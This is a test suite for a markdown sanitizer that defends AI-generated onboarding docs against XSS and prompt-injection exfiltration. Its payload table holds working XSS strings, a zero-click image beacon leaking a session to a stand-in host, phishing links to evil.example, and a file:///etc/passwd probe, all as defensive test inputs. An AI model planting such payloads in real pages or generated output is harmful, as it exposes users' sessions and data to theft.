/**
 * Write-time markdown sanitizer — the mechanical half of the
 * prompt-injection defense (doc/SECURITY_XSS_PROMPT_INJECTION.md P2/X1).
 *
 * Every payload here is a real attack string, not a placeholder. The hostnames
 * use RFC 2606 reserved domains (`.example`, `.invalid`) so nothing in this
 * suite can reach a live host even if a future change made it try.
 */

import { expect } from 'chai';
import { isSafeDestination, sanitizeGeneratedMarkdown } from '../markdownSanitizer.js';

/** The payload table, shared with the prompt-injection suite and the report. */
export const XSS_PAYLOADS: Array<{ id: string; label: string; payload: string }> = [
  { id: 'X-script', label: 'raw <script> tag', payload: '<script>window.__pwn=1</script>' },
  { id: 'X-img-onerror', label: '<img onerror> handler', payload: '<img src=x onerror="window.__pwn=1">' },
  { id: 'X-svg-onload', label: '<svg onload> handler', payload: '<svg onload="window.__pwn=1"></svg>' },
  { id: 'X-b-onmouseover', label: 'inline event handler on a formatting tag', payload: '<b onmouseover="window.__pwn=1">hover</b>' },
  { id: 'X-js-link', label: 'javascript: link', payload: '[click me](javascript:window.__pwn=1)' },
  { id: 'X-data-link', label: 'data:text/html link', payload: '[click me](data:text/html,<script>window.__pwn=1</script>)' },
  { id: 'X-beacon-img', label: 'external image beacon (zero-click)', payload: '![](https://beacon.invalid/p.png?leak=session)' },
  { id: 'X-phish-link', label: 'external phishing link', payload: '[Log in to continue](https://evil.example/login)' },
  { id: 'X-js-autolink', label: 'javascript: autolink', payload: '<javascript:window.__pwn=1>' },
  { id: 'X-proto-relative', label: 'protocol-relative link', payload: '[x](//evil.example/steal)' },
  { id: 'X-html-comment', label: 'HTML comment', payload: '<!-- exfiltrate: token -->' },
  { id: 'X-nested-tag', label: 'nested tag that re-forms when stripped naively', payload: '<scr<script>ipt>window.__pwn=1</scr</script>ipt>' },
];

describe('markdownSanitizer — destination allowlist', () => {
  it('accepts this app\'s own citation anchors', () => {
    expect(isSafeDestination('#receipt:3f2a8c11-0000-4000-8000-000000000000')).to.equal(true);
    expect(isSafeDestination('#unverified')).to.equal(true);
  });

  it('accepts relative paths but never protocol-relative ones', () => {
    expect(isSafeDestination('/projects/1')).to.equal(true);
    expect(isSafeDestination('./setup')).to.equal(true);
    expect(isSafeDestination('../guide')).to.equal(true);
    expect(isSafeDestination('//evil.example/steal')).to.equal(false);
  });

  it('accepts https github.com and its subdomains only', () => {
    expect(isSafeDestination('https://github.com/o/r/blob/main/a.ts')).to.equal(true);
    expect(isSafeDestination('https://gist.github.com/o/1')).to.equal(true);
    expect(isSafeDestination('http://github.com/o/r')).to.equal(false, 'plain http is not allowed');
    // The classic allowlist bypass: attacker registers github.com.evil.example.
    expect(isSafeDestination('https://github.com.evil.example/o/r')).to.equal(false);
    expect(isSafeDestination('https://notgithub.com/o/r')).to.equal(false);
  });

  it('rejects script-bearing and opaque schemes', () => {
    expect(isSafeDestination('javascript:window.__pwn=1')).to.equal(false);
    expect(isSafeDestination('JaVaScRiPt:window.__pwn=1')).to.equal(false);
    expect(isSafeDestination('data:text/html,<script>1</script>')).to.equal(false);
    expect(isSafeDestination('vbscript:msgbox')).to.equal(false);
    expect(isSafeDestination('file:///etc/passwd')).to.equal(false);
  });

  it('rejects whitespace-smuggled schemes and empty destinations', () => {
    expect(isSafeDestination('java\tscript:window.__pwn=1')).to.equal(false);
    expect(isSafeDestination('java\nscript:window.__pwn=1')).to.equal(false);
    expect(isSafeDestination('')).to.equal(false);
    expect(isSafeDestination('   ')).to.equal(false);
  });
});

describe('markdownSanitizer — every payload is defanged', () => {
  for (const { id, label, payload } of XSS_PAYLOADS) {
    it(`${id}: ${label}`, () => {
      const { markdown } = sanitizeGeneratedMarkdown(`Some prose. ${payload} More prose.`);
      // The three things that make a payload dangerous: an HTML tag, a live
      // scheme, or an off-allowlist destination. None may survive.
      expect(markdown).to.not.match(/<[a-zA-Z/!]/, 'no HTML tag or comment may survive');
      expect(markdown.toLowerCase()).to.not.include('javascript:');
      expect(markdown.toLowerCase()).to.not.include('data:text/html');
      expect(markdown).to.not.include('](https://beacon.invalid');
      expect(markdown).to.not.include('](https://evil.example');
      expect(markdown).to.not.include('](//evil.example');
      // Prose either side is untouched — sanitizing is not censoring.
      expect(markdown).to.include('Some prose.');
      expect(markdown).to.include('More prose.');
    });
  }

  it('reports what it removed instead of silently dropping it', () => {
    const result = sanitizeGeneratedMarkdown(
      '![](https://beacon.invalid/a.png) [x](https://evil.example) <script>1</script> <javascript:x>',
    );
    expect(result.modified).to.equal(true);
    expect(result.removed.images).to.equal(1);
    expect(result.removed.links).to.equal(1);
    expect(result.removed.html).to.be.greaterThan(0);
    expect(result.removed.autolinks).to.equal(1);
  });

  it('leaves clean prose byte-identical', () => {
    const clean = [
      '**TL;DR:** The worker turns a repo into onboarding docs.',
      '',
      '### snapshot',
      'One analysis run over one commit. Lives in `analysis_snapshots`.',
      '',
      '- See [the repo](https://github.com/owner/repo/blob/main/x.ts) for the handler.',
      '- Receipt marker: [[receipt:3f2a8c11-0000-4000-8000-000000000000]]',
      '- Anchor link: [jump](#receipt:3f2a8c11-0000-4000-8000-000000000000)',
      '',
      '```ts',
      'const el = `<img src=x onerror="1">`; // code is evidence, not markup',
      '```',
    ].join('\n');
    const result = sanitizeGeneratedMarkdown(clean);
    expect(result.markdown).to.equal(clean);
    expect(result.modified).to.equal(false);
  });
});

describe('markdownSanitizer — code is evidence and stays verbatim', () => {
  it('never edits inside a fenced code block', () => {
    const md = ['Intro.', '```html', '<img src=x onerror="window.__pwn=1">', '```', 'Outro.'].join('\n');
    const { markdown, modified } = sanitizeGeneratedMarkdown(md);
    expect(markdown).to.equal(md);
    expect(modified).to.equal(false);
  });

  it('never edits inside an inline code span', () => {
    const md = 'The repo literally contains `<img src=x onerror="1">` in a test fixture.';
    expect(sanitizeGeneratedMarkdown(md).markdown).to.equal(md);
  });

  it('still sanitizes prose on a line that also has a code span', () => {
    const md = 'Use `<img>` carefully — <script>window.__pwn=1</script> is not allowed.';
    const { markdown } = sanitizeGeneratedMarkdown(md);
    expect(markdown).to.include('`<img>`', 'the code span survives');
    expect(markdown).to.not.include('<script>', 'the prose tag does not');
  });

  it('resumes sanitizing after a closed fence', () => {
    const md = ['```', '<script>ok in code</script>', '```', '<script>window.__pwn=1</script>'].join('\n');
    const { markdown } = sanitizeGeneratedMarkdown(md);
    expect(markdown).to.include('<script>ok in code</script>');
    expect(markdown.split('\n').pop()).to.not.include('<script>');
  });
});

describe('markdownSanitizer — image and reference forms', () => {
  it('removes every image form, keeping the alt words', () => {
    const inline = sanitizeGeneratedMarkdown('![architecture diagram](https://beacon.invalid/x.png)');
    expect(inline.markdown).to.equal('architecture diagram');

    const reference = sanitizeGeneratedMarkdown('![architecture diagram][beacon]');
    expect(reference.markdown).to.equal('architecture diagram');
    expect(reference.removed.images).to.equal(1);

    const shortcut = sanitizeGeneratedMarkdown('![beacon]');
    expect(shortcut.removed.images).to.equal(1);
  });

  it('removes images even from a github.com host — the pipeline emits none', () => {
    const result = sanitizeGeneratedMarkdown('![logo](https://github.com/o/r/logo.png)');
    expect(result.removed.images).to.equal(1);
    expect(result.markdown).to.not.include('https://github.com/o/r/logo.png');
  });

  it('drops a reference definition pointing off-allowlist', () => {
    const md = ['See [the docs][d].', '', '[d]: https://evil.example/phish'].join('\n');
    const { markdown, removed } = sanitizeGeneratedMarkdown(md);
    expect(markdown).to.not.include('evil.example');
    expect(removed.links).to.be.greaterThan(0);
  });

  it('keeps a reference definition pointing at github', () => {
    const md = ['See [the code][c].', '', '[c]: https://github.com/o/r'].join('\n');
    expect(sanitizeGeneratedMarkdown(md).markdown).to.include('[c]: https://github.com/o/r');
  });
});

describe('markdownSanitizer — link destinations', () => {
  it('keeps the link text and drops only the destination', () => {
    const { markdown } = sanitizeGeneratedMarkdown('Read [the security policy](https://evil.example/p) first.');
    expect(markdown).to.equal('Read the security policy first.');
  });

  it('strips a destination even when brackets nest in the label', () => {
    const { markdown } = sanitizeGeneratedMarkdown('[a[b]](https://evil.example)');
    expect(markdown).to.not.include('evil.example');
  });

  it('handles a destination carrying a title', () => {
    const { markdown } = sanitizeGeneratedMarkdown('[x](https://evil.example "come here")');
    expect(markdown).to.not.include('evil.example');
    expect(sanitizeGeneratedMarkdown('[x](https://github.com/o/r "the repo")').markdown)
      .to.include('https://github.com/o/r');
  });

  it('handles an angle-bracketed destination', () => {
    expect(sanitizeGeneratedMarkdown('[x](<https://evil.example/a b>)').markdown).to.not.include('evil.example');
    expect(sanitizeGeneratedMarkdown('[x](<https://github.com/o/r>)').markdown).to.include('github.com/o/r');
  });
});

describe('markdownSanitizer — degenerate input', () => {
  it('treats null/undefined/empty as empty', () => {
    for (const input of [null, undefined, '']) {
      const result = sanitizeGeneratedMarkdown(input);
      expect(result.markdown).to.equal('');
      expect(result.modified).to.equal(false);
    }
  });

  it('terminates on a deeply nested tag sandwich', () => {
    const nasty = `${'<'.repeat(200)}script${'>'.repeat(200)}`;
    const { markdown } = sanitizeGeneratedMarkdown(nasty);
    expect(markdown).to.not.match(/<script>/i);
  });
});
